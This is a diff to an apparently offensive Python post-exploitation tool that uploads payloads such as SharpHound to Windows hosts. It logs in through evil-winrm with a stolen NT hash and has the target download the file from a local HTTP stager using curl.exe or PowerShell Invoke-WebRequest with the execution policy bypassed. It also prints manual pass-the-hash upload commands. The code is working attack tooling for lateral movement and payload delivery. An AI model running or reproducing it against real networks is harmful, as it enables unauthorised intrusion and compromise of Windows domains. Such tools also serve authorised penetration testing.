@@ -3,20 +3,31 @@ from __future__ import annotations
 import base64
 import os
 import re
+import shutil
 import subprocess
 from pathlib import Path
+from typing import Any
 
 from admapper.postex.evil_winrm_output import extract_winrm_command_body
 from admapper.support.output import print_error, print_info, print_success, print_warning
 from admapper.support.platform import resolve_executable, subprocess_run_kwargs
 from admapper.winrm.client import WinRMClient, WinRMError
 
-_B64_LINE = 480
-_B64_BATCH = 10
 _DEFAULT_HTTP_PORT = 8765
 _WINRM_TIMEOUT = 120
 _UPLOAD_TIMEOUT = 180
 _UPLOAD_TIMEOUT_MAX = 600
+_LARGE_HTTP_THRESHOLD = 400_000
+
+
+def _parse_length_from_output(output: str) -> int | None:
+    """Parse ``Length : 123456`` from PowerShell ``Format-List`` / ``dir`` output."""
+    for line in output.splitlines():
+        if re.search(r"\bLength\b", line, re.I):
+            match = re.search(r"(\d+)\s*$", line.strip())
+            if match:
+                return int(match.group(1))
+    return None
 
 
 def _winrm_target(client: WinRMClient) -> str:
@@ -74,7 +85,11 @@ def _parse_dir_size(output: str, filename: str) -> int | None:
 
 
 def _run_evil_winrm_stdin(
-    client: WinRMClient, script: str, *, timeout: int = _UPLOAD_TIMEOUT
+    client: WinRMClient,
+    script: str,
+    *,
+    timeout: int = _UPLOAD_TIMEOUT,
+    cwd: Path | None = None,
 ) -> str:
     ew = resolve_executable(["evil-winrm"])
     if not ew or not client.nthash:
@@ -82,6 +97,7 @@ def _run_evil_winrm_stdin(
     target = _winrm_target(client)
     user = _winrm_user(client)
     cmd = [ew, "-i", target, "-u", user, "-H", client.nthash]
+    run_cwd = str(cwd.resolve()) if cwd is not None else None
     try:
         proc = subprocess.run(
             cmd,
@@ -89,6 +105,7 @@ def _run_evil_winrm_stdin(
             capture_output=True,
             text=True,
             timeout=timeout,
+            cwd=run_cwd,
             **subprocess_run_kwargs(),
         )
     except subprocess.TimeoutExpired as exc:
@@ -126,6 +143,48 @@ def _verify_via_evil_winrm_stdin(
     return False
 
 
+def _powershell_remote_file_size(client: WinRMClient, remote_path: str) -> int | None:
+    safe = remote_path.replace("'", "''")
+    try:
+        proc = client.execute(
+            f"if(Test-Path -LiteralPath '{safe}'){{(Get-Item -LiteralPath '{safe}').Length}}",
+            shell="powershell",
+            timeout=60,
+        )
+        for line in (proc.stdout or "").splitlines():
+            token = line.strip()
+            if token.isdigit():
+                return int(token)
+    except WinRMError:
+        pass
+    return None
+
+
+def _http_upload_verified(
+    client: WinRMClient,
+    remote_path: str,
+    *,
+    expected_size: int,
+) -> bool:
+    size = _powershell_remote_file_size(client, remote_path)
+    if size is not None and size == expected_size:
+        return True
+    if remote_file_ok(client, remote_path, expected_size=expected_size):
+        return True
+    status = ""
+    try:
+        from admapper.postex.monitor_log import remote_file_status
+
+        status = remote_file_status(client, remote_path)
+    except Exception:
+        pass
+    if status and status != "MISSING":
+        print_warning(f"upload: HTTP fetched but verify failed — remote: {status}")
+    else:
+        print_warning("upload: HTTP fetched but remote file missing or size mismatch")
+    return False
+
+
 def remote_file_ok(
     client: WinRMClient,
     remote_path: str,
@@ -133,6 +192,11 @@ def remote_file_ok(
     expected_size: int | None = None,
 ) -> bool:
     """Return True if *remote_path* exists (optionally matching byte size)."""
+    if expected_size is not None:
+        ps_size = _powershell_remote_file_size(client, remote_path)
+        if ps_size is not None and ps_size == expected_size:
+            return True
+
     if client.ticket_method == "nthash" and client.nthash:
         if _verify_via_evil_winrm_stdin(client, remote_path, expected_size=expected_size):
             return True
@@ -177,100 +241,43 @@ def manual_upload_instructions(
     filename = remote.rsplit("\\", 1)[-1]
     remote_fwd = remote_path.replace("\\", "/")
     lines = [
-        "# evil-winrm interactive — use / in remote path or upload+copy",
+        "# evil-winrm: upload lands in Documents — copy to absolute path",
+        f"cd {local_abs.parent}",
         f"evil-winrm -i {target} -u '{user}' -H {nthash}",
-        f"mkdir {parent} -Force",
-        "# option A (recommended): forward slashes",
-        f"upload {local_abs} {remote_fwd}",
-        f"dir {remote_fwd}",
-        "# option B: upload to cwd and copy",
-        f"upload {local_abs} {filename}",
-        f"copy .\\{filename} {remote}",
-        f"dir {remote}",
+        f"upload {filename}",
+        f"Copy-Item -Force .\\{filename} '{remote}'",
+        f"Get-Item '{remote}' | Format-List Mode,Length,LastWriteTime",
         "",
     ]
     if http_fetch_host:
         lines.extend(
             [
-                "# Alternativa HTTP",
+                "# Alternativa HTTP (target curl — más fiable que certutil)",
                 f"cd {local_abs.parent} && python3 -m http.server {http_port}",
-                f"certutil -f -urlcache -split -f http://{http_fetch_host}:{http_port}/{local_path.name} {remote}",
+                f"curl.exe -fsSL -o {remote} http://{http_fetch_host}:{http_port}/{local_path.name}",
             ]
         )
     return "\n".join(lines)
 
 
+def _remote_parent_dir(remote_path: str) -> str | None:
+    """Parent directory of a Windows remote path (handles ``/`` or ``\\``)."""
+    normalized = remote_path.replace("/", "\\")
+    if "\\" not in normalized:
+        return None
+    return normalized.rsplit("\\", 1)[0]
+
+
 def _ensure_parent_dir(client: WinRMClient, remote_path: str) -> None:
-    parent = remote_path.rsplit("\\", 1)[0].replace("'", "''")
+    parent = _remote_parent_dir(remote_path)
+    if not parent:
+        return
+    safe_parent = parent.replace("'", "''")
     client.execute(
-        f"New-Item -ItemType Directory -Force -Path '{parent}' | Out-Null",
+        f"New-Item -ItemType Directory -Force -Path '{safe_parent}' | Out-Null",
         shell="powershell",
         timeout=_WINRM_TIMEOUT,
     )
-
-
-def _stage_certutil_b64(
-    client: WinRMClient,
-    data: bytes,
-    *,
-    filename: str,
-) -> None:
-    """Write base64 to %TEMP% and certutil -decode to %TEMP%\\*filename*."""
-    safe_name = filename.replace("'", "''")
-    client.execute(
-        f"Remove-Item -Force -ErrorAction SilentlyContinue "
-        f"(Join-Path $env:TEMP '{safe_name}'),(Join-Path $env:TEMP '.admapper_payload.b64')",
-        shell="powershell",
-        timeout=_WINRM_TIMEOUT,
-    )
-    encoded = base64.b64encode(data).decode("ascii")
-    lines = [encoded[i : i + _B64_LINE] for i in range(0, len(encoded), _B64_LINE)]
-    total = len(lines)
-    for batch_start in range(0, total, _B64_BATCH):
-        batch = lines[batch_start : batch_start + _B64_BATCH]
-        parts = [
-            f"Add-Content -Path (Join-Path $env:TEMP '.admapper_payload.b64') "
-            f"-Value '{line}' -NoNewline"
-            for line in batch
-        ]
-        client.execute(";".join(parts), shell="powershell", timeout=_WINRM_TIMEOUT)
-        done = min(batch_start + len(batch), total)
-        print_info(f"upload: certutil staging {done}/{total} b64 lines")
-    client.execute(
-        f'certutil -f -decode "%TEMP%\\.admapper_payload.b64" "%TEMP%\\{filename}"',
-        shell="cmd",
-        timeout=_WINRM_TIMEOUT,
-    )
-    client.execute(
-        "Remove-Item -Force -ErrorAction SilentlyContinue "
-        "(Join-Path $env:TEMP '.admapper_payload.b64')",
-        shell="powershell",
-        timeout=_WINRM_TIMEOUT,
-    )
-
-
-def _upload_via_certutil_b64(
-    client: WinRMClient,
-    data: bytes,
-    remote_path: str,
-) -> bool:
-    """Decode to %TEMP% then Copy-Item — same pattern as manual upload+copy."""
-    filename = remote_path.rsplit("\\", 1)[-1]
-    safe_name = filename.replace("'", "''")
-    final_ps = remote_path.replace("'", "''")
-    _stage_certutil_b64(client, data, filename=filename)
-    client.execute(
-        f"Copy-Item -Force -LiteralPath (Join-Path $env:TEMP '{safe_name}') "
-        f"-Destination '{final_ps}'",
-        shell="powershell",
-        timeout=_WINRM_TIMEOUT,
-    )
-    client.execute(
-        f"Remove-Item -Force -ErrorAction SilentlyContinue (Join-Path $env:TEMP '{safe_name}')",
-        shell="powershell",
-        timeout=_WINRM_TIMEOUT,
-    )
-    return remote_file_ok(client, remote_path, expected_size=len(data))
 
 
 def _upload_base64_chunks(
@@ -308,50 +315,97 @@ def _upload_via_evil_winrm_builtin(
     *,
     expected_size: int,
 ) -> bool:
-    """Built-in ``upload`` over evil-winrm stdin (SMB) — same transport as interactive shell."""
+    """Built-in ``upload`` over evil-winrm stdin — same as interactive (upload name, then copy)."""
     ew = resolve_executable(["evil-winrm"])
     if not ew or not client.nthash:
         return False
 
-    local_q = _quote_evil_winrm_local(local_path)
-    remote_fwd = remote_path.replace("\\", "/")
-    parent = remote_path.rsplit("\\", 1)[0]
-    filename = remote_path.rsplit("\\", 1)[-1]
+    local_dir = local_path.parent.resolve()
+    filename = local_path.name
+    parent = remote_path.rsplit("\\", 1)[0].replace("/", "\\")
     remote_bs = remote_path.replace("/", "\\")
+    remote_ps = remote_bs.replace("'", "''")
     parent_q = f"'{parent}'" if " " in parent else parent
     timeout = _upload_timeout(expected_size)
 
-    direct_script = "\n".join(
+    # Interactive pattern: cwd = local dir, ``upload SharpHound.exe``, then Copy-Item.
+    # Do NOT pass a remote path to ``upload`` — evil-winrm ignores/mangles it.
+    script = "\n".join(
         [
             f"mkdir {parent_q} -Force",
-            f"upload {local_q} {remote_fwd}",
-            f"dir {remote_fwd}",
+            f"upload {filename}",
+            f"Copy-Item -Force .\\{filename} '{remote_ps}'",
+            f"Get-Item -LiteralPath '{remote_ps}' | Format-List Length",
             "exit",
         ]
     )
-    print_info(f"upload: evil-winrm direct → {remote_fwd} (timeout {timeout}s)")
+    print_info(
+        f"upload: evil-winrm upload+copy → {remote_bs} "
+        f"(cwd {local_dir.name}/, timeout {timeout}s)"
+    )
     try:
-        _run_evil_winrm_stdin(client, direct_script + "\n", timeout=timeout)
+        output = _run_evil_winrm_stdin(
+            client, script + "\n", timeout=timeout, cwd=local_dir
+        )
     except WinRMError as exc:
-        print_warning(f"upload: evil-winrm direct failed — {exc}")
-    if _verify_via_evil_winrm_stdin(client, remote_path, expected_size=expected_size):
-        return True
+        print_warning(f"upload: evil-winrm failed — {exc}")
+        return False
 
-    copy_script = "\n".join(
-        [
-            f"mkdir {parent_q} -Force",
-            f"upload {local_q} {filename}",
-            f"copy .\\{filename} {remote_bs}",
-            f"dir {remote_fwd}",
-            "exit",
-        ]
-    )
-    print_info("upload: evil-winrm upload+copy fallback")
-    try:
-        _run_evil_winrm_stdin(client, copy_script + "\n", timeout=timeout)
-    except WinRMError as exc:
-        print_warning(f"upload: evil-winrm copy fallback failed — {exc}")
+    parsed_len = _parse_length_from_output(output)
+    if parsed_len is not None and parsed_len == expected_size:
+        return True
+    ps_len = _powershell_remote_file_size(client, remote_path)
+    if ps_len is not None and ps_len == expected_size:
+        return True
     return _verify_via_evil_winrm_stdin(client, remote_path, expected_size=expected_size)
+
+
+class _StagingHTTPRequestHandler:
+    """SimpleHTTPRequestHandler that tolerates client disconnects on large files."""
+
+    @staticmethod
+    def factory():
+        from http.server import SimpleHTTPRequestHandler
+
+        class Handler(SimpleHTTPRequestHandler):
+            def log_message(self, format: str, *args: Any) -> None:
+                pass
+
+            def copyfile(self, source: Any, outputfile: Any) -> None:
+                try:
+                    shutil.copyfileobj(source, outputfile, length=64 * 1024)
+                except (BrokenPipeError, ConnectionResetError):
+                    pass
+
+        return Handler
+
+
+def _start_http_stager(*, port: int) -> tuple[Any, Any, int]:
+    """Bind on 0.0.0.0; try fallback ports when the default is taken."""
+    from http.server import ThreadingHTTPServer
+    from threading import Thread
+
+    handler = _StagingHTTPRequestHandler.factory()
+    last_err: Exception | None = None
+    for candidate in (port, 8767, 18765, 9876):
+        try:
+            server = ThreadingHTTPServer(("0.0.0.0", candidate), handler)
+            thread = Thread(target=server.serve_forever, daemon=True)
+            thread.start()
+            return server, thread, candidate
+        except OSError as exc:
+            last_err = exc
+            continue
+    raise OSError(f"could not bind HTTP stager on ports tried from {port}") from last_err
+
+
+def _stop_http_stager(server: Any, thread: Any) -> None:
+    try:
+        server.shutdown()
+    except Exception:
+        pass
+    if thread is not None:
+        thread.join(timeout=3.0)
 
 
 def _upload_via_http(
@@ -362,48 +416,65 @@ def _upload_via_http(
     local_path: Path,
     http_fetch_host: str,
     http_port: int = _DEFAULT_HTTP_PORT,
-    timeout: int = _UPLOAD_TIMEOUT_MAX,
+    timeout: int | None = None,
 ) -> bool:
     """Stage payload via local HTTP server and fetch with curl.exe or Invoke-WebRequest."""
-    from http.server import HTTPServer, SimpleHTTPRequestHandler
-    from threading import Thread
-
     local_dir = local_path.parent.resolve()
     orig_dir = Path.cwd()
     os.chdir(local_dir)
-    server = HTTPServer((http_fetch_host, http_port), SimpleHTTPRequestHandler)
-    thread = Thread(target=server.serve_forever, daemon=True)
-    thread.start()
+    server, thread, bound_port = _start_http_stager(port=http_port)
+    expected_size = len(data)
+    fetch_timeout = timeout if timeout is not None else _upload_timeout(expected_size)
     try:
         _ensure_parent_dir(client, remote_path)
-        remote_ps = remote_path.replace("'", "''")
-        safe_url = f"http://{http_fetch_host}:{http_port}/{local_path.name}".replace("'", "''")
+        remote_ps = remote_path.replace("/", "\\").replace("'", "''")
+        safe_url = (
+            f"http://{http_fetch_host}:{bound_port}/{local_path.name}".replace("'", "''")
+        )
 
-        try:
-            client.execute(
-                f"curl.exe -fsSL -o '{remote_ps}' '{safe_url}'",
-                shell="cmd",
-                timeout=timeout,
-            )
-            return True
-        except WinRMError:
-            pass
-
-        try:
-            client.execute(
-                f"powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "
-                f"\"Invoke-WebRequest -Uri '{safe_url}' -OutFile '{remote_ps}' -UseBasicParsing\"",
-                shell="cmd",
-                timeout=timeout,
-            )
-            return True
-        except WinRMError:
-            pass
-
+        curl_cmd = (
+            f'curl.exe -fsSL --retry 3 --retry-delay 2 --max-time {fetch_timeout} '
+            f"-o '{remote_ps}' '{safe_url}'"
+        )
+        iwr_cmd = (
+            f"powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "
+            f"\"Invoke-WebRequest -Uri '{safe_url}' -OutFile '{remote_ps}' -UseBasicParsing\""
+        )
+        for label, script in (("curl", curl_cmd), ("iwr", iwr_cmd)):
+            try:
+                client.execute(script, shell="cmd", timeout=fetch_timeout + 30)
+            except WinRMError:
+                continue
+            verified = _http_upload_verified(client, remote_path, expected_size=expected_size)
+            if verified:
+                return True
         return False
     finally:
         os.chdir(orig_dir)
-        server.shutdown()
+        _stop_http_stager(server, thread)
+
+
+def _try_winrm_transports(
+    client: WinRMClient,
+    data: bytes,
+    remote_path: str,
+    *,
+    local_path: Path,
+    expected_size: int,
+) -> str | None:
+    """evil-winrm builtin upload, then WinRM base64 chunks as fallback."""
+    if client.ticket_method == "nthash" and client.nthash:
+        print_info(f"upload: evil-winrm builtin @ {_winrm_target(client)} ({expected_size} bytes)")
+        if _upload_via_evil_winrm_builtin(
+            client, local_path, remote_path, expected_size=expected_size
+        ):
+            return "evil_winrm"
+        print_info("upload: evil-winrm failed — trying WinRM binary chunks")
+        if _upload_base64_chunks(client, data, remote_path):
+            return "winrm_chunks"
+    elif _upload_base64_chunks(client, data, remote_path):
+        return "winrm_chunks"
+    return None
 
 
 def upload_file(
@@ -417,7 +488,7 @@ def upload_file(
     """Upload a local file to a remote windows path.
 
     Returns the transport key that succeeded (e.g. ``evil_winrm``,
-    ``certutil``, ``winrm_chunks``, ``http_curl``, ``http_iwr``) so callers
+    ``winrm_chunks``, ``http``) so callers can decide whether a separate
     can decide whether a separate WinRM verification round is meaningful.
     Raises :class:`WinRMError` if nothing succeeds.
     """
@@ -426,29 +497,74 @@ def upload_file(
     data = local_path.read_bytes()
     expected_size = len(data)
     target = _winrm_target(client)
+    _ensure_parent_dir(client, remote_path)
+    try:
+        from admapper.postex.monitor_log import remediate_remote_zip_path
 
-    if client.ticket_method == "nthash" and client.nthash:
-        # Skip nxc mkdir here — gMSA PTH often returns empty stdout; evil-winrm script creates parent.
-        print_info(f"upload: evil-winrm builtin @ {target} ({expected_size} bytes → {remote_path})")
-        if _upload_via_evil_winrm_builtin(
-            client, local_path, remote_path, expected_size=expected_size
+        remediate_remote_zip_path(client, remote_path)
+    except Exception:
+        pass
+
+    if (
+        expected_size > _LARGE_HTTP_THRESHOLD
+        and client.ticket_method == "nthash"
+        and client.nthash
+    ):
+        print_info(
+            f"upload: large payload ({expected_size} bytes) — WinRM transports before HTTP"
+        )
+        transport = _try_winrm_transports(
+            client,
+            data,
+            remote_path,
+            local_path=local_path,
+            expected_size=expected_size,
+        )
+        if transport:
+            print_success(f"upload OK — {transport} ({expected_size} bytes)")
+            return transport
+
+    if http_fetch_host:
+        print_info(
+            f"upload: HTTP staging @ {http_fetch_host}:{http_port} "
+            f"({expected_size} bytes → {remote_path})"
+        )
+        if _upload_via_http(
+            client,
+            data,
+            remote_path,
+            local_path=local_path,
+            http_fetch_host=http_fetch_host,
+            http_port=http_port,
         ):
-            print_success(f"upload OK — evil-winrm builtin ({expected_size} bytes)")
-            return "evil_winrm"
-        _ensure_parent_dir(client, remote_path)
-        print_info("upload: evil-winrm builtin failed — trying certutil staging")
-        if _upload_via_certutil_b64(client, data, remote_path):
-            print_success(f"upload OK — certutil staging ({expected_size} bytes)")
-            return "certutil"
-        print_info("upload: certutil staging failed — trying WinRM binary chunks")
-        if _upload_base64_chunks(client, data, remote_path):
-            print_success(f"upload OK — base64 chunks ({expected_size} bytes)")
-            return "winrm_chunks"
-    else:
-        _ensure_parent_dir(client, remote_path)
-        if _upload_base64_chunks(client, data, remote_path):
-            print_success(f"upload OK — WinRM base64 ({expected_size} bytes)")
-            return "winrm_chunks"
+            print_success(f"upload OK — HTTP staging ({expected_size} bytes)")
+            return "http"
+        print_warning("upload: HTTP staging failed — trying WinRM transports")
+        try:
+            from admapper.postex.monitor_log import remote_file_status
+
+            status = remote_file_status(client, remote_path)
+            print_info(f"upload: remote state: {status}")
+            if "d----" in status.lower():
+                raise WinRMError(
+                    "remote ZIP path is a directory — delete it on target, then retry "
+                    "(admapper postex logs -w <workspace> to inspect)"
+                )
+        except WinRMError:
+            raise
+        except Exception:
+            pass
+
+    transport = _try_winrm_transports(
+        client,
+        data,
+        remote_path,
+        local_path=local_path,
+        expected_size=expected_size,
+    )
+    if transport:
+        print_success(f"upload OK — {transport} ({expected_size} bytes)")
+        return transport
 
     manual = manual_upload_instructions(
         client,
@@ -458,9 +574,14 @@ def upload_file(
         http_port=http_port,
     )
     if http_fetch_host:
-        print_info("automatic upload failed — trying HTTP staging fallback")
+        print_info("upload: retrying HTTP staging as last resort")
         if _upload_via_http(
-            client, data, remote_path, local_path=local_path, http_fetch_host=http_fetch_host, http_port=http_port
+            client,
+            data,
+            remote_path,
+            local_path=local_path,
+            http_fetch_host=http_fetch_host,
+            http_port=http_port,
         ):
             print_success(f"upload OK — HTTP staging ({expected_size} bytes)")
             return "http"
